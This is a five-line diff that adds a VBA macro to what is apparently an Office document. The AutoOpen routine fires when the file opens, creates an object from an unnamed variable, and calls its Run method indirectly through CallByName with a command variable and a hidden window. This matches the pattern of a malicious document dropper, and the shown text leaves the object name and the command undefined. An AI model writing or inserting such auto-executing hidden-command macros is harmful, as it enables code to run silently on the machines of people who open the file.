@@ -1,0 +1,5 @@
+Sub AutoOpen()
+Set o = CreateObject(x)
+CallByName o, "Run", VbMethod, cmd, 0
+End Sub
+
